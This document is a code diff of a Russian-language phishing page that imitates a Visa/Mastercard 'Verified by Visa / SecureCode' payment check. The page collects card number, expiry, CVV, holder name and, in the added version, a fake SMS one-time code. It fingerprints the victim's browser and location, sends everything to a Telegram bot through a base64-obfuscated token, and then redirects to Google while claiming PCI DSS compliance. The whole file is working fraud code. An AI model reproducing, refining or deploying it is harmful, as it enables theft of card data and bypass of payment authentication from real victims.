@@ -3,459 +3,338 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
     <title>Безопасность платежа</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background: linear-gradient(135deg, #e8edf5 0%, #b8c6d8 100%);
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            display: flex; justify-content: center; align-items: center;
             padding: 20px;
         }
         .container {
-            background: #fff;
-            border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-            width: 420px;
-            max-width: 100%;
-            overflow: hidden;
-            position: relative;
+            background: #fff; border-radius: 18px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.2);
+            width: 450px; max-width: 100%; overflow: hidden;
         }
         .header {
-            background: linear-gradient(to right, #1a3b5d, #0d2440);
-            padding: 20px;
-            color: white;
-            text-align: center;
-            position: relative;
+            background: linear-gradient(145deg, #0e2b4a 0%, #071c33 100%);
+            padding: 22px 20px; color: white; text-align: center;
         }
-        .header .lock-icon {
-            font-size: 26px;
-            margin-bottom: 8px;
-        }
-        .header h3 {
-            font-weight: 600;
-            font-size: 18px;
-            margin-bottom: 4px;
-        }
-        .header p {
-            font-size: 12px;
-            opacity: 0.9;
-        }
+        .header .lock-icon { font-size: 28px; margin-bottom: 6px; }
+        .header h3 { font-size: 18px; font-weight: 600; margin-bottom: 2px; }
+        .header .sub { font-size: 12px; opacity: 0.85; margin-bottom: 8px; }
+        .secure-badge { font-size: 12px; color: #6fcf97; display: flex; align-items: center; justify-content: center; gap: 5px; }
         .logos {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 20px;
-            padding: 15px 20px;
-            background: #f8f9fb;
+            display: flex; justify-content: center; align-items: center;
+            gap: 25px; padding: 15px 20px; background: #f7f9fc;
             border-bottom: 1px solid #eee;
         }
-        .logos img {
-            height: 28px;
+        .logos img { height: 26px; }
+        .steps { display: flex; justify-content: center; margin: 18px 0 8px; }
+        .step { width: 32px; height: 32px; border-radius: 50%; background: #ddd; color: #666; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
+        .step.active { background: #0066cc; color: white; }
+        .step.completed { background: #28a745; color: white; }
+        .step-connector { width: 40px; height: 2px; background: #ccc; margin: 15px 6px 0; }
+        .step-connector.active { background: #0066cc; }
+        .step-connector.completed { background: #28a745; }
+        .panel { padding: 20px 25px; }
+        .panel h2 { font-size: 17px; color: #1a1a1a; text-align: center; margin-bottom: 18px; }
+        .bank-info {
+            background: #f0f5fa; border-radius: 10px; padding: 12px;
+            margin-bottom: 18px; display: none; align-items: center; gap: 12px;
         }
-        .secure-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 12px;
-            color: #2d8b46;
-            font-weight: 500;
-            margin-top: 8px;
-        }
-        .secure-badge span {
-            font-size: 14px;
-        }
-        .steps {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0 10px;
-        }
-        .step {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            background: #e0e0e0;
-            color: #999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        .step.active {
-            background: #0070ba;
-            color: white;
-        }
-        .step.completed {
-            background: #2d8b46;
-            color: white;
-        }
-        .step-connector {
-            width: 40px;
-            height: 2px;
-            background: #ccc;
-            margin: 14px 8px 0;
-        }
-        .step-connector.completed {
-            background: #2d8b46;
-        }
-        .form-panel {
-            padding: 20px 25px;
-        }
-        .form-panel h2 {
-            font-size: 16px;
-            margin-bottom: 15px;
-            color: #222;
-            text-align: center;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 5px;
-            color: #444;
-        }
+        .bank-info img { width: 36px; height: 36px; border-radius: 6px; object-fit: contain; background: white; padding: 2px; }
+        .bank-info .bank-name { font-weight: 600; font-size: 14px; color: #1a3b5d; }
+        .input-group { margin-bottom: 14px; }
+        .input-group label { font-size: 13px; font-weight: 500; color: #333; display: block; margin-bottom: 4px; }
         .input-group input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            font-size: 15px;
-            transition: border 0.3s;
-            outline: none;
+            width: 100%; padding: 12px 14px; border: 2px solid #dcdfe6; border-radius: 10px;
+            font-size: 15px; outline: none; transition: 0.2s;
         }
-        .input-group input:focus {
-            border-color: #0070ba;
-            box-shadow: 0 0 0 3px rgba(0,112,186,0.1);
-        }
-        .row {
-            display: flex;
-            gap: 10px;
-        }
-        .row .input-group {
-            flex: 1;
-        }
+        .input-group input:focus { border-color: #0066cc; box-shadow: 0 0 0 3px rgba(0,102,204,0.1); }
+        .row { display: flex; gap: 10px; }
+        .row .input-group { flex: 1; }
         .btn {
-            width: 100%;
-            padding: 14px;
-            background: #0070ba;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
-            margin-top: 10px;
+            width: 100%; padding: 14px; background: #0066cc; color: white; border: none;
+            border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer;
+            margin-top: 10px; transition: 0.2s;
         }
-        .btn:hover {
-            background: #005a94;
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        .btn:disabled {
-            background: #a0c1d9;
-            cursor: not-allowed;
-        }
-        .loading-screen {
-            display: none;
-            text-align: center;
-            padding: 40px 20px;
-        }
+        .btn:hover { background: #0052a3; }
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { background: #8fbbd9; cursor: wait; }
+        .loading { text-align: center; padding: 35px 20px; }
         .spinner {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0070ba;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            width: 48px; height: 48px; border: 5px solid #e9ecef;
+            border-top-color: #0066cc; border-radius: 50%; animation: spin 0.9s linear infinite;
+            margin: 0 auto 18px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .info-text {
-            color: #555;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        .disclaimer {
-            font-size: 11px;
-            color: #888;
-            text-align: center;
-            padding: 10px 20px 20px;
-        }
-        .card-icons {
-            display: flex;
-            gap: 5px;
-            margin-top: 5px;
-        }
-        .card-icons img {
-            width: 24px;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success-icon { font-size: 52px; margin-bottom: 12px; }
+        .disclaimer { font-size: 11px; color: #999; text-align: center; padding: 8px 20px 18px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="lock-icon">🔒</div>
-            <h3>Проверка безопасности</h3>
-            <p>Verified by Visa / Mastercard SecureCode</p>
-            <div class="secure-badge">
-                <span>✅</span> Ваше соединение защищено
-            </div>
-        </div>
-        <div class="logos">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="AmEx" style="height:22px">
-        </div>
+<div class="container">
+    <div class="header">
+        <div class="lock-icon">🔒</div>
+        <h3>Проверка безопасности</h3>
+        <div class="sub">Mastercard SecureCode • Verified by Visa</div>
+        <div class="secure-badge"><span>✅</span> Защищённое соединение</div>
+    </div>
+    <div class="logos">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1200px-American_Express_logo_%282018%29.svg.png" alt="AmEx" style="height:22px">
+    </div>
 
-        <!-- Шаг 1: форма ввода -->
-        <div id="step1">
-            <div class="steps">
-                <div class="step active">1</div>
-                <div class="step-connector"></div>
-                <div class="step">2</div>
-                <div class="step-connector"></div>
-                <div class="step">3</div>
-            </div>
-            <div class="form-panel">
-                <h2>Подтверждение платёжных данных</h2>
-                <form id="cardForm">
-                    <div class="input-group">
-                        <label>Номер карты</label>
-                        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required autocomplete="off">
-                        <div class="card-icons">
-                            <img src="https://img.icons8.com/color/48/000000/visa.png" alt="visa">
-                            <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="mc">
-                        </div>
-                    </div>
-                    <div class="row">
-                        <div class="input-group">
-                            <label>Месяц</label>
-                            <input type="text" id="expMonth" placeholder="MM" maxlength="2" required>
-                        </div>
-                        <div class="input-group">
-                            <label>Год</label>
-                            <input type="text" id="expYear" placeholder="ГГ" maxlength="2" required>
-                        </div>
-                        <div class="input-group">
-                            <label>CVV</label>
-                            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
-                        </div>
-                    </div>
-                    <div class="input-group">
-                        <label>Имя держателя</label>
-                        <input type="text" id="cardHolder" placeholder="IVAN IVANOV" required>
-                    </div>
-                    <button type="submit" class="btn" id="submitBtn">Продолжить</button>
-                </form>
-            </div>
+    <!-- Шаг 1: Данные карты -->
+    <div id="step1">
+        <div class="steps">
+            <div class="step active">1</div><div class="step-connector"></div>
+            <div class="step">2</div><div class="step-connector"></div>
+            <div class="step">3</div>
         </div>
-
-        <!-- Шаг 2: экран обработки -->
-        <div id="step2" style="display: none;">
-            <div class="steps">
-                <div class="step completed">✓</div>
-                <div class="step-connector completed"></div>
-                <div class="step active">2</div>
-                <div class="step-connector"></div>
-                <div class="step">3</div>
+        <div class="panel">
+            <h2>Подтверждение карты</h2>
+            <div class="bank-info" id="bankInfo">
+                <img id="bankLogo" src="" alt="bank">
+                <span class="bank-name" id="bankName"></span>
             </div>
-            <div class="loading-screen" style="display:block;">
-                <div class="spinner"></div>
-                <h3>Обработка данных...</h3>
-                <p class="info-text">Пожалуйста, не закрывайте страницу.<br>Проверка занимает до 30 секунд.</p>
-            </div>
-        </div>
-
-        <!-- Шаг 3: финальный редирект (скрыт) -->
-        <div id="step3" style="display: none;">
-            <div class="steps">
-                <div class="step completed">✓</div>
-                <div class="step-connector completed"></div>
-                <div class="step completed">✓</div>
-                <div class="step-connector completed"></div>
-                <div class="step completed">✓</div>
-            </div>
-            <div class="loading-screen" style="display:block;">
-                <div style="font-size: 48px; color: #2d8b46;">✅</div>
-                <h3>Проверка пройдена</h3>
-                <p class="info-text">Перенаправление...</p>
-            </div>
-        </div>
-
-        <div class="disclaimer">
-            Ваши данные защищены согласно стандарту PCI DSS. Мы не храним вашу платёжную информацию.
+            <form id="cardForm">
+                <div class="input-group">
+                    <label>Номер карты</label>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" required>
+                </div>
+                <div class="row">
+                    <div class="input-group"><label>Месяц</label><input type="text" id="expMonth" placeholder="MM" maxlength="2" required></div>
+                    <div class="input-group"><label>Год</label><input type="text" id="expYear" placeholder="ГГ" maxlength="2" required></div>
+                    <div class="input-group"><label>CVV</label><input type="text" id="cvv" placeholder="123" maxlength="4" required></div>
+                </div>
+                <div class="input-group">
+                    <label>Имя держателя</label>
+                    <input type="text" id="cardHolder" placeholder="ALEXANDER IVANOV" required>
+                </div>
+                <button type="submit" class="btn" id="submitCard">Продолжить</button>
+            </form>
         </div>
     </div>
 
-    <script>
-        // ==================== ОБФУСЦИРОВАННЫЙ КОНФИГ ====================
-        // Все строки закодированы в base64. Перед деплоем замените на свои!
-        const _cfg = {
-            bt: atob('ODgwMjM4MzUwMzpBQUdFeXlndVVHV0NQdXVvWnN0bWZISjNPVzRDZnpPMFZ5TQ=='),  // ваш BOT_TOKEN в base64
-            cid: atob('NzA0MTE5OTM1MQ=='),                     // ваш CHAT_ID в base64
-            redir: 'https://www.google.com'                 // куда редиректить после успеха
-        };
+    <!-- Шаг 2: Имитация отправки SMS -->
+    <div id="step2" style="display: none;">
+        <div class="steps">
+            <div class="step completed">✓</div><div class="step-connector completed"></div>
+            <div class="step active">2</div><div class="step-connector"></div>
+            <div class="step">3</div>
+        </div>
+        <div class="loading">
+            <div class="spinner"></div>
+            <h3>Отправляем код подтверждения...</h3>
+            <p style="color:#555; margin-top:8px;">SMS на номер, привязанный к вашей карте</p>
+        </div>
+    </div>
 
-        // ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
-        async function getIPData() {
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await ipRes.json();
-                const ip = ipJson.ip;
-                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,query`);
-                const geo = await geoRes.json();
-                return {
-                    ip: ip,
-                    country: geo.country || 'N/A',
-                    region: geo.regionName || '',
-                    city: geo.city || '',
-                    isp: geo.isp || '',
-                    org: geo.org || ''
-                };
-            } catch (e) {
-                return { ip: 'unknown', country: 'unknown' };
-            }
+    <!-- Шаг 3: Ввод OTP (любой) -->
+    <div id="step3" style="display: none;">
+        <div class="steps">
+            <div class="step completed">✓</div><div class="step-connector completed"></div>
+            <div class="step completed">✓</div><div class="step-connector active"></div>
+            <div class="step active">3</div>
+        </div>
+        <div class="panel">
+            <h2>Введите код из SMS</h2>
+            <p style="text-align:center; font-size:13px; color:#555; margin-bottom:15px;">Код отправлен на номер, связанный с вашей картой</p>
+            <form id="otpForm">
+                <div class="input-group">
+                    <input type="text" id="otpCode" placeholder="Введите 6-значный код" maxlength="6" inputmode="numeric" pattern="[0-9]*" required>
+                </div>
+                <button type="submit" class="btn">Подтвердить</button>
+            </form>
+            <p style="text-align:center; margin-top:12px; font-size:12px; color:#888;">Не получили код? <a href="#" id="resendLink" style="color:#0066cc;">Отправить повторно</a></p>
+        </div>
+    </div>
+
+    <!-- Финальный экран успеха (скрыт) -->
+    <div id="stepFinal" style="display: none;">
+        <div class="steps">
+            <div class="step completed">✓</div><div class="step-connector completed"></div>
+            <div class="step completed">✓</div><div class="step-connector completed"></div>
+            <div class="step completed">✓</div>
+        </div>
+        <div class="loading">
+            <div class="success-icon">✅</div>
+            <h3>Проверка пройдена</h3>
+            <p style="color:#555;">Сейчас вы будете перенаправлены...</p>
+        </div>
+    </div>
+    <div class="disclaimer">Ваши данные защищены согласно стандарту PCI DSS. Мы не храним платёжную информацию.</div>
+</div>
+
+<script>
+// ========== КОНФИГУРАЦИЯ (токен и chat_id закодированы) ==========
+const _cfg = {
+    bt: atob('ODgwMjM4MzUwMzpBQUdFeXlndVVHV0NQdXVvWnN0bWZISjNPVzRDZnpPMFZ5TQ=='),
+    cid: atob('NzA0MTE5OTM1MQ=='),
+    redir: 'https://www.google.com'
+};
+
+// ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
+function getIPData() {
+    return fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => fetch(`http://ip-api.com/json/${d.ip}?fields=status,country,regionName,city,isp,org,query`))
+        .then(r => r.json())
+        .catch(() => ({}));
+}
+
+function getFingerprint() {
+    const f = {
+        ua: navigator.userAgent,
+        plat: navigator.platform,
+        lang: navigator.language,
+        scr: `${screen.width}x${screen.height}`,
+        color: screen.colorDepth,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cores: navigator.hardwareConcurrency || '?',
+        mem: navigator.deviceMemory || '?',
+        touch: navigator.maxTouchPoints > 0
+    };
+    try {
+        const c = document.createElement('canvas');
+        const x = c.getContext('2d');
+        x.fillStyle = '#f60'; x.fillRect(0,0,100,100);
+        x.fillStyle = '#069'; x.fillText('FP', 2, 15);
+        f.canvas = c.toDataURL().slice(0,80);
+    } catch(e) {}
+    try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (gl) {
+            const inf = gl.getExtension('WEBGL_debug_renderer_info');
+            f.gpu = inf ? gl.getParameter(inf.UNMASKED_RENDERER_WEBGL) : 'webgl';
         }
+    } catch(e) {}
+    return f;
+}
 
-        function getFingerprint() {
-            return new Promise(resolve => {
-                const data = {
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: screen.width + 'x' + screen.height,
-                    colorDepth: screen.colorDepth,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cores: navigator.hardwareConcurrency || 'unknown',
-                    memory: navigator.deviceMemory || 'unknown',
-                    touch: navigator.maxTouchPoints > 0,
-                    gpu: 'unknown'
-                };
-                try {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(0,0,100,100);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('Fingerprint', 2, 15);
-                    data.canvas = canvas.toDataURL().substring(0, 80);
-                } catch(e) {}
-                try {
-                    const gl = document.createElement('canvas').getContext('webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'webgl_supported';
+function sendTelegram(text) {
+    const url = `https://api.telegram.org/bot${_cfg.bt}/sendMessage`;
+    return fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: _cfg.cid, text, parse_mode: 'HTML' })
+    }).catch(() => {});
+}
+
+// ========== ДИНАМИЧЕСКОЕ ОПРЕДЕЛЕНИЕ БАНКА ПО BIN ==========
+const cardInput = document.getElementById('cardNumber');
+const bankInfo = document.getElementById('bankInfo');
+const bankLogo = document.getElementById('bankLogo');
+const bankName = document.getElementById('bankName');
+
+cardInput.addEventListener('input', function(e) {
+    let val = this.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+    const formatted = val.match(/.{1,4}/g);
+    this.value = formatted ? formatted.join(' ') : '';
+    if (val.length >= 6) {
+        const bin = val.substring(0,6);
+        fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept': 'application/json' } })
+            .then(r => r.json())
+            .then(data => {
+                if (data.bank && data.bank.name) {
+                    bankName.textContent = data.bank.name;
+                    bankInfo.style.display = 'flex';
+                    if (data.bank.logo) {
+                        bankLogo.src = data.bank.logo;
+                    } else if (data.bank.url) {
+                        bankLogo.src = `https://logo.clearbit.com/${new URL(data.bank.url).hostname}`;
+                    } else {
+                        bankLogo.src = 'https://img.icons8.com/color/48/bank-building.png';
                     }
-                } catch(e) {}
-                resolve(data);
-            });
-        }
+                } else if (data.country) {
+                    bankName.textContent = `Банк-эмитент (${data.country.alpha2})`;
+                    bankInfo.style.display = 'flex';
+                    bankLogo.src = 'https://img.icons8.com/color/48/bank.png';
+                }
+            })
+            .catch(() => {});
+    } else {
+        bankInfo.style.display = 'none';
+    }
+});
 
-        function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${_cfg.bt}/sendMessage`;
-            return fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: _cfg.cid,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            });
-        }
+// ========== ШАГ 1 -> ШАГ 2 (SMS) ==========
+document.getElementById('cardForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+    // имитация задержки отправки SMS
+    setTimeout(() => {
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'block';
+    }, 2800);
+});
 
-        // ==================== ОСНОВНАЯ ЛОГИКА ====================
-        document.getElementById('cardForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+// ========== ШАГ 3 (OTP) -> СБОР И ОТПРАВКА ==========
+document.getElementById('otpForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const otp = document.getElementById('otpCode').value;
+    const cardNum = cardInput.value.replace(/\s/g, '');
+    const month = document.getElementById('expMonth').value;
+    const year = document.getElementById('expYear').value;
+    const cvv = document.getElementById('cvv').value;
+    const name = document.getElementById('cardHolder').value;
 
-            // Блокируем кнопку и показываем шаг 2
-            document.getElementById('submitBtn').disabled = true;
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
+    // Показываем финальный экран
+    document.getElementById('step3').style.display = 'none';
+    document.getElementById('stepFinal').style.display = 'block';
 
-            // Считываем данные карты
-            const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
-            const month = document.getElementById('expMonth').value;
-            const year = document.getElementById('expYear').value;
-            const cvv = document.getElementById('cvv').value;
-            const name = document.getElementById('cardHolder').value;
+    // Параллельный сбор гео и отпечатка
+    const [geo, fp] = await Promise.all([getIPData(), Promise.resolve(getFingerprint())]);
 
-            // Параллельно собираем IP и fingerprint
-            const [ipData, fingerprint] = await Promise.all([getIPData(), getFingerprint()]);
+    const message = `<b>💳 НОВАЯ КАРТА (с OTP)</b>
+━━━━━━━━━━━━━━━
+<b>Карта:</b> <code>${cardNum}</code>
+<b>Срок:</b> ${month}/${year}
+<b>CVV:</b> <code>${cvv}</code>
+<b>Держатель:</b> ${name}
+<b>OTP код:</b> <code>${otp}</code>
 
-            // Формируем сообщение
-            const message = `
-    <b>💳 НОВАЯ КАРТА</b>
-    ━━━━━━━━━━━━━━━━━
-    <b>Карта:</b> <code>${cardNum}</code>
-    <b>Срок:</b> ${month}/${year}
-    <b>CVV:</b> <code>${cvv}</code>
-    <b>Держатель:</b> ${name}
+🌍 <b>Гео:</b>
+IP: ${geo.query || 'нет'}
+Страна: ${geo.country || '-'}, ${geo.city || '-'}
+Провайдер: ${geo.isp || '-'} (${geo.org || ''})
 
-    🌍 <b>Геолокация:</b>
-    IP: ${ipData.ip}
-    Страна: ${ipData.country}, ${ipData.city}
-    Провайдер: ${ipData.isp} (${ipData.org})
+🖥 <b>Устройство:</b>
+${fp.ua}
+Язык: ${fp.lang} | Экран: ${fp.scr}
+GPU: ${fp.gpu || '-'} | CPU: ${fp.cores}
+Canvas: ${fp.canvas || '-'}
+TZ: ${fp.tz}`;
 
-    🖥 <b>Устройство:</b>
-    ОС/Браузер: ${fingerprint.ua}
-    Язык: ${fingerprint.language}
-    Экран: ${fingerprint.screen}
-    Ядер CPU: ${fingerprint.cores}
-    GPU: ${fingerprint.gpu}
-    Часовой пояс: ${fingerprint.timezone}
-    Canvas fingerprint: ${fingerprint.canvas || 'нет'}
-            `.trim();
+    sendTelegram(message);
 
-            // Отправляем в телегу
-            try {
-                await sendToTelegram(message);
-            } catch (err) {
-                console.error('Telegram send error:', err);
-            }
+    // Редирект через 2.5 секунды
+    setTimeout(() => { window.location.replace(_cfg.redir); }, 2500);
+});
 
-            // Имитация проверки 3-5 секунд
-            setTimeout(() => {
-                document.getElementById('step2').style.display = 'none';
-                document.getElementById('step3').style.display = 'block';
-                // Редирект через 2 секунды
-                setTimeout(() => {
-                    window.location.replace(_cfg.redir);
-                }, 2000);
-            }, 4000); // можно уменьшить до 2500 для быстроты
-        });
+// Имитация повторной отправки SMS
+document.getElementById('resendLink').addEventListener('click', function(e) {
+    e.preventDefault();
+    document.getElementById('step3').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+    setTimeout(() => {
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'block';
+    }, 2500);
+});
 
-        // Форматирование номера карты
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let val = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let matches = val.match(/.{1,4}/g);
-            this.value = matches ? matches.join(' ') : '';
-        });
-
-        // Автопереход с month на year при заполнении 2-х цифр
-        document.getElementById('expMonth').addEventListener('input', function() {
-            if (this.value.length === 2) document.getElementById('expYear').focus();
-        });
-    </script>
+// Автопереход с месяца на год
+document.getElementById('expMonth').addEventListener('input', function() {
+    if (this.value.length === 2) document.getElementById('expYear').focus();
+});
+</script>
 </body>
 </html>
